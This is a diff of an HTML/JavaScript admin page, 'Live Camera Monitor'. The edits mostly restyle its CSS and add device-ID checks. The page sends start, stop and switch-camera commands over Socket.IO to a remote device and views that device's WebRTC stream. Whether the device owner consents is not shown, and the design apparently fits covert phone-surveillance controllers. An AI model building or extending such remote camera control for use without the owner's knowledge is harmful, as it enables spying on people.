@@ -2,121 +2,164 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Live Camera Monitor</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
 
 <style>
+/* --- 1. COLORS & VARIABLES --- */
 :root{
-    --bg:#0f0f10;
-    --panel:#1c1c1e;
-    --green:#30d158;
-    --red:#ff453a;
-    --blue:#0a84ff;
+    --bg: #121212;
+    --panel: #1e1e1e;
+    --green: #2ecc71;
+    --red: #e74c3c;
+    --blue: #3498db;
+    --text: #ffffff;
 }
 
-body{
-    margin:0;
-    background:var(--bg);
-    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
-    display:flex;
-    justify-content:center;
-    /* Laptop screen fix: Body full height aur scroll band */
+/* --- 2. GLOBAL RESET --- */
+body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     height: 100vh;
-    overflow: hidden; 
+    height: 100dvh; /* Mobile browser address bar fix */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden; /* No scrollbars */
 }
 
-.app{
-    width:100%;
-    max-width:480px;
-    /* Change: min-height hata kar height 100% kar diya */
-    height:100%; 
-    background:#000;
-    display:flex;
-    flex-direction:column;
-    /* Thoda shadow diya taaki laptop pe alag dikhe */
-    box-shadow: 0 0 20px rgba(0,0,0,0.5); 
-}
-
-/* HEADER */
-.header{
-    /* Flex-shrink 0 means ye shrink nahi hoga */
-    flex-shrink: 0; 
-    padding:14px 16px;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    border-bottom:1px solid rgba(255,255,255,0.1);
-    background: var(--panel); /* Header color match kiya */
-    color: white;
-}
-
-.status{
-    font-size:12px;
-    padding:5px 14px;
-    border-radius:20px;
-    background:var(--red);
-    font-weight:700;
-    color: white;
-}
-
-.status.live{
-    background:var(--green);
-    color:#000;
-}
-
-/* VIDEO - Main Adjustment Here */
-.video-box{
-    flex:1; /* Ye baki bachi hui jagah lega */
-    background:black;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow: hidden; /* Video bahar nahi jayega */
+/* --- 3. APP CONTAINER (PHONE LOOK) --- */
+.app {
+    width: 100%;
+    height: 100%;
+    background: #000;
+    display: flex;
+    flex-direction: column;
     position: relative;
+    overflow: hidden;
 }
 
-video{
-    width:100%;
-    height:100%;
-    object-fit:contain; /* Video katne ki jagah fit hoga */
+/* Laptop/Desktop Specific Styles */
+@media (min-width: 501px) {
+    .app {
+        max-width: 400px;       /* Phone Width */
+        height: 85vh;           /* Phone Height */
+        max-height: 800px;
+        border-radius: 25px;    /* Rounded Corners */
+        box-shadow: 0 0 40px rgba(0,0,0,0.6); /* Shadow */
+        border: 4px solid #333; /* Bezel */
+    }
 }
 
-/* CONTROLS */
-.controls{
-    flex-shrink: 0; /* Buttons kabhi shrink nahi honge */
-    padding:18px;
-    background:var(--panel);
-    display:flex;
-    gap:12px;
-    /* Bottom safe area for mobile */
-    padding-bottom: max(18px, env(safe-area-inset-bottom)); 
+/* --- 4. HEADER --- */
+.header {
+    flex-shrink: 0; /* Header kabhi shrink nahi hoga */
+    padding: 15px 20px;
+    background: var(--panel);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+    z-index: 10;
 }
 
-.btn{
-    flex:1;
-    border:none;
-    border-radius:16px;
-    padding:15px 0;
-    font-size:15px;
-    font-weight:700;
-    color:white;
-    cursor:pointer;
-    transition: opacity 0.2s;
+.title {
+    color: var(--text);
+    font-weight: 600;
+    font-size: 16px;
+    letter-spacing: 0.5px;
+}
+
+.status {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 12px;
+    background: rgba(231, 76, 60, 0.2);
+    color: var(--red);
+    font-weight: 700;
+    text-transform: uppercase;
+    border: 1px solid var(--red);
+}
+
+.status.live {
+    background: rgba(46, 204, 113, 0.2);
+    color: var(--green);
+    border: 1px solid var(--green);
+}
+
+/* --- 5. VIDEO AREA (FLEXIBLE) --- */
+.video-box {
+    flex-grow: 1; /* Ye bachi hui sari jagah lega */
+    background: #000;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+}
+
+video {
+    width: 100%;
+    height: 100%;
+    object-fit: contain; /* Video kategi nahi, fit hogi */
+}
+
+/* --- 6. CONTROLS (FIXED BOTTOM) --- */
+.controls {
+    flex-shrink: 0; /* Buttons kabhi gayab nahi honge */
+    padding: 20px;
+    background: var(--panel);
+    display: flex;
+    gap: 15px;
+    /* iPhone Home Bar Safe Area */
+    padding-bottom: max(20px, env(safe-area-inset-bottom));
+    border-top: 1px solid rgba(255,255,255,0.1);
+}
+
+.btn {
+    border: none;
+    border-radius: 12px;
+    padding: 16px 0;
+    font-size: 14px;
+    font-weight: 600;
+    color: white;
+    cursor: pointer;
+    transition: transform 0.1s ease, opacity 0.2s;
+    display: flex;
+    justify-content: center;
+    align-items: center;
 }
 
 .btn:active {
-    opacity: 0.7;
+    transform: scale(0.96);
+    opacity: 0.8;
 }
 
-.start{ background:var(--green); color:#000; }
-.stop{ background:var(--red); }
-.switch{
-    background:var(--blue);
-    max-width:70px;
-    font-size:18px;
+/* Button Colors */
+.start {
+    flex: 2; /* Start button bada */
+    background: var(--green);
+    color: #000;
+    box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
 }
+
+.stop {
+    flex: 2; /* Stop button bada */
+    background: var(--red);
+    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+}
+
+.switch {
+    flex: 1; /* Switch button chota */
+    background: #333;
+    font-size: 20px;
+    color: var(--blue);
+}
+
 </style>
 </head>
 
@@ -125,7 +168,7 @@ video{
 <div class="app">
 
     <div class="header">
-        <span>Live Camera</span>
+        <span class="title">📷 Camera Monitor</span>
         <span id="status" class="status">OFFLINE</span>
     </div>
 
@@ -134,9 +177,9 @@ video{
     </div>
 
     <div class="controls">
-        <button class="btn start" onclick="startCamera()">▶ START</button>
+        <button class="btn start" onclick="startCamera()">Start</button>
         <button class="btn switch" onclick="switchCamera()">🔄</button>
-        <button class="btn stop" onclick="stopCamera()">⏹ STOP</button>
+        <button class="btn stop" onclick="stopCamera()">Stop</button>
     </div>
 
 </div>
@@ -154,7 +197,8 @@ if(!DEVICE_ID){
 }
 
 if(!DEVICE_ID){
-    alert("Device ID missing!");
+    // Fallback taaki UI khali na lage agar ID na ho
+    console.log("Device ID missing in URL or LocalStorage"); 
 }
 
 /* ================= WEBRTC ================= */
@@ -171,6 +215,7 @@ const config = {
 socket = io(SERVER);
 
 socket.on("connect", ()=>{
+    console.log("Connected to Server");
     socket.emit("join-room","ADMIN");
 });
 
@@ -191,7 +236,7 @@ socket.on("offer", async (data)=>{
             video.srcObject = stream;
         }
 
-        video.play().catch(()=>{});
+        video.play().catch(e => console.log("Autoplay error:", e));
         setStatus(true);
     };
 
@@ -206,13 +251,7 @@ socket.on("offer", async (data)=>{
         }
     };
 
-    // 🔥 FIXED PART
-    await pc.setRemoteDescription(
-        new RTCSessionDescription({
-            type: "offer",
-            sdp: data.sdp
-        })
-    );
+    await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
 
     const ans = await pc.createAnswer();
     await pc.setLocalDescription(ans);
@@ -238,6 +277,8 @@ socket.on("candidate", async d=>{
 /* ================= BUTTONS ================= */
 
 function startCamera(){
+    if(!DEVICE_ID) { alert("Device ID nahi mila! URL me ?id=YOUR_ID lagayein."); return; }
+    
     socket.emit("send-command",{
         targetId: DEVICE_ID,
         command: "start_video"
@@ -245,6 +286,8 @@ function startCamera(){
 }
 
 function stopCamera(){
+    if(!DEVICE_ID) return;
+
     socket.emit("send-command",{
         targetId: DEVICE_ID,
         command: "stop_video"
@@ -262,10 +305,11 @@ function stopCamera(){
 }
 
 function switchCamera(){
+    if(!DEVICE_ID) return;
     socket.emit("switch-camera",{ target: DEVICE_ID });
 }
 
-/* ================= UI ================= */
+/* ================= UI HELPER ================= */
 
 function setStatus(live){
     const s = document.getElementById("status");
